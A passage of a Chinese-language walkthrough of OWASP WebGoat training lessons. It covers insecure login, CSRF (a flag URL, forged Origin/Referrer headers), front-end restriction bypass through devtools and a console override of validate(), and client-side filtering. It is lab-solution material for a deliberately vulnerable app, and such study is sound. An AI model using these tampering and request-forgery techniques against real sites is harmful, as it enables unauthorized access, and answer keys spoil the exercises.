141)\">&#x27;application/json; charset=UTF-8&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">then</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token parameter\">response</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> response</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token method function property-access\" style=\"color:rgb(130, 170, 255)\">json</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>如此，便會回傳 <code>userHash</code> 回來：</p><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">{</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">username</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;foobar&quot;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">admin</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token boolean\" style=\"color:rgb(255, 88, 116)\">false</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token literal-property property\">userHash</span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">:</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;geBkYlCYL/bnMdYLiEhtzVQ9nGFm/5EK8X/JyHE2+FA=&quot;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">}</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"insecure-communication\">Insecure Communication<a href=\"#insecure-communication\" class=\"hash-link\" aria-label=\"Insecure Communication的直接連結\" title=\"Insecure Communication的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"insecure-login\">Insecure Login<a href=\"#insecure-login\" class=\"hash-link\" aria-label=\"Insecure Login的直接連結\" title=\"Insecure Login的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q2-5\">Q2<a href=\"#q2-5\" class=\"hash-link\" aria-label=\"Q2的直接連結\" title=\"Q2的直接連結\">​</a></h4><p>當按下畫面上的 login 時，從 network panel 可以看到送出了 <code>username</code> 和 <code>password</code> 這兩個欄位：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/y3feXv8.png\" alt=\"imgur\" class=\"img_ev3q\"></p><p>把這兩個欄位填入下面的 input 中送出即可。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"insecure-deserialization未解\">Insecure Deserialization（未解）<a href=\"#insecure-deserialization未解\" class=\"hash-link\" aria-label=\"Insecure Deserialization（未解）的直接連結\" title=\"Insecure Deserialization（未解）的直接連結\">​</a></h2><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"request-forgeries\">Request Forgeries<a href=\"#request-forgeries\" class=\"hash-link\" aria-label=\"Request Forgeries的直接連結\" title=\"Request Forgeries的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"cross-site-request-forgeries\">Cross-site Request Forgeries<a href=\"#cross-site-request-forgeries\" class=\"hash-link\" aria-label=\"Cross-site Request Forgeries的直接連結\" title=\"Cross-site Request Forgeries的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q3-6\">Q3<a href=\"#q3-6\" class=\"hash-link\" aria-label=\"Q3的直接連結\" title=\"Q3的直接連結\">​</a></h4><p>按下「提交」後，會另外開啟一個網頁：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/4XriLZ1.png\" alt=\"imgur\" class=\"img_ev3q\"></p><p>將網址中的 <code>csrf</code> 改成 <code>true</code> 即可：</p><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">http://localhost:8080/WebGoat/csrf/basic-get-flag?csrf=true&amp;submit=%E6%8F%90%E4%BA%A4</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q4-3\">Q4<a href=\"#q4-3\" class=\"hash-link\" aria-label=\"Q4的直接連結\" title=\"Q4的直接連結\">​</a></h4><p>利用 OWASP 攔截請求，修改 <code>Origin</code> 和 <code>Referrer</code> 假裝是不同來源的即可：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/oGrabxo.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q7-3\">Q7<a href=\"#q7-3\" class=\"hash-link\" aria-label=\"Q7的直接連結\" title=\"Q7的直接連結\">​</a></h4><p>先根據說明填寫表單：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/gGuyfxE.png\" alt=\"imgur\" class=\"img_ev3q\"></p><p>接著利用 OWASP 攔截送出的請求，將 <code>Origin</code> 和 <code>Referrer</code> 修改成其他來源，然後 <code>Content-Type</code> 根據提示改成 <code>text/plain</code> 後再送出：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/6ushOVx.png\" alt=\"imgur\" class=\"img_ev3q\"></p><p>成功後即可拿到 <code>flag</code> 貼上即可：</p><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">Congratulations you have found the correct solution, the flag is: c5c27a69-91e5-46dd-aff9-dcaf909adb0d</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q8-2\">Q8<a href=\"#q8-2\" class=\"hash-link\" aria-label=\"Q8的直接連結\" title=\"Q8的直接連結\">​</a></h4><p>另外一開個新視窗，建立一組新帳號，帳號名稱前綴多 <code>csrf-</code>，進入題目頁，按下送出。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"vulnerable-components未解\">Vulnerable Components（未解）<a href=\"#vulnerable-components未解\" class=\"hash-link\" aria-label=\"Vulnerable Components（未解）的直接連結\" title=\"Vulnerable Components（未解）的直接連結\">​</a></h2><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"client-side\">Client Side<a href=\"#client-side\" class=\"hash-link\" aria-label=\"Client Side的直接連結\" title=\"Client Side的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"bypass-front-end-restrictions\">Bypass front-end restrictions<a href=\"#bypass-front-end-restrictions\" class=\"hash-link\" aria-label=\"Bypass front-end restrictions的直接連結\" title=\"Bypass front-end restrictions的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q2-6\">Q2<a href=\"#q2-6\" class=\"hash-link\" aria-label=\"Q2的直接連結\" title=\"Q2的直接連結\">​</a></h4><p>利用開發者工具的 element panel 做如下修改：</p><div class=\"language-html codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-html codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">&lt;!-- select: 修改 value 的值 --&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">select</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">name</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">select</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">option</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">value</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">option3</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\">Option 1</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;/</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">option</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">  </span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">option</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">value</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">option2</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\">Option 2</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;/</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">option</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;/</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">select</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">&lt;!-- radio: 修改 value 的值 --&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">input</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">type</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">radio</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">name</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">radio</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">value</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">option3</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">checked</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">checked</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">/&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">&lt;!-- checkbox: 新增 value --&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">input</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">type</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">checkbox</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">name</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">checkbox</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">checked</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">checked</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">value</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">foo</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">/&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">&lt;!-- input: 修改 maxlength --&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">input</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">type</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">text</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">value</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">12345678</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">name</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">shortInput</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">maxlength</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">10</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">/&gt;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>按下送出即可。</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q3-7\">Q3<a href=\"#q3-7\" class=\"hash-link\" aria-label=\"Q3的直接連結\" title=\"Q3的直接連結\">​</a></h4><p>從 Elements panel 中可以看到，送出表單時會透過 <code>validate()</code> 這個方法進行表單驗證，如果驗證成功則回傳 <code>true</code>：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/czMAZBa.png\" alt=\"imgur\" class=\"img_ev3q\"></p><p>從 console panel 該寫 <code>validate()</code> 這個方法，改成不管怎麼樣都回傳 true：</p><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">// 在 console panel 中輸入</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token function-variable function\" style=\"color:rgb(130, 170, 255)\">validate</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">(</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">)</span><span class=\"token plain\"> </span><span class=\"token arrow operator\" style=\"color:rgb(137, 221, 255)\">=&gt;</span><span class=\"token plain\"> </span><span class=\"token boolean\" style=\"color:rgb(255, 88, 116)\">true</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>接著在表單中填入不符合規則的內容，按下送出。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"client-side-filtering\">Client side filtering<a href=\"#client-side-filtering\" class=\"hash-link\" aria-label=\"Client side filtering的直接連結\" title=\"Client side filtering的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q2-7\">Q2<a href=\"#q2-7\" class=\"hash-link\" aria-label=\"Q2的直接連結\" title=\"Q2的直接連結\">​</a></h4><p>直接在 Elements Panel 中搜尋關鍵字 <code>Neville</code> 就可以找到隱藏的資料，salary 即為 <code>450000</code>：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/oK5naTR.png\" alt=\"imgur\" class=\"img_ev3q\"></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q3-8\">Q3<a href=\"#q3-8\" class=\"hash-link\" aria-label=\"Q3的直接連結\" title=\"Q3的直接連結\">​</a></h4><p>進到 WebGoat 的 <a href=\"https://github.com/WebGoat/WebGoat\" target=\"_blank\" rel=\"noopener noreferrer\">github 專案</a>搜尋 <code>checkoutCode</code>，找到檔案 <a href=\"https://github.com/WebGoat/WebGoat/blob/4d7d0058c3ba0b4e542ed7e964ee1056207b7a08/webgoat-lessons/client-side-filtering/src/main/java/org/owasp/webgoat/plugin/ClientSideFilteringFreeAssignment.java\" target=\"_blank\" rel=\"noopener noreferrer\"><code>/src/main/java/org/owasp/webgoat/plugin/ClientSideFilteringFreeAssignment.java</code></a></p><p>這隻檔案中會標註<strong>特殊折扣碼</strong>是什麼：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/lOSCapR.png\" alt=\"imgur\" class=\"img_ev3q\"></p><p>將此特殊折扣碼 <code>get_it_for_free</code> 貼上即可完成。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"html-tampering\">HTML tampering<a href=\"#html-tampering\" class=\"hash-link\" aria-label=\"HTML tampering的直接連結\" title=\"HTML tampering的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"q2-8\">Q2<a 